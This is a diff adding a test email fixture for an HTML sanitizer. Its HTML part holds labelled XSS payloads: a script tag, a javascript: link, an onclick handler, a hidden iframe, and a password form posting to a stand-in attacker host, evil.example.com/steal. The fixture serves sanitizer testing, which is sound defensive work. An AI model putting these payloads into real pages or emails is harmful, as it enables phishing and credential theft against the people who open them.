@@ -1,0 +1,42 @@
+From: attacker@external.test
+To: user@example.com
+Subject: XSS sanitize test
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="==xss_test_boundary=="
+
+--==xss_test_boundary==
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+This is the plain text fallback. The HTML part contains XSS payloads.
+
+--==xss_test_boundary==
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>XSS sanitize-worker test</h2>
+
+<script>alert('XSS: script tag should be removed');</script>
+
+<iframe src="https://evil.example.com/phishing" width="0" height="0"></iframe>
+
+<p onclick="alert('XSS: onclick should be removed')">This paragraph has an onclick handler.</p>
+
+<a href="javascript:alert('XSS: javascript href should be removed')">Click me (dangerous)</a>
+
+<form action="https://evil.example.com/steal" method="post">
+  <input type="password" name="pw">
+  <input type="submit" value="Submit">
+</form>
+
+<p>This paragraph should <strong>remain</strong> after sanitization.</p>
+<a href="https://www.example.com">Safe link (should remain)</a>
+
+</body>
+</html>
+
+--==xss_test_boundary==--
